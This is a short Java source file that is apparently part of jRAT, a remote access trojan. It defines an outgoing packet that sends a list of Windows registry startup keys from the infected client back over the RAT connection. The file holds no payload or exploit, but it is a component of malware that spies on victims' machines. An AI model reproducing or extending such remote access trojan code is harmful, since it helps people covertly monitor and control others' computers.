package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet53RegistryStartup extends AbstractOutgoingPacket {

	private String[] keys;

	public Packet53RegistryStartup(String[] keys) {
		this.keys = keys;
	}

	public Packet53RegistryStartup(String key) {
		this.keys = new String[] { key };
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeInt(keys.length);

		for (String key : keys) {
            con.writeLine(key);
		}
	}

	@Override
	public short getPacketId() {
		return 53;
	}

}
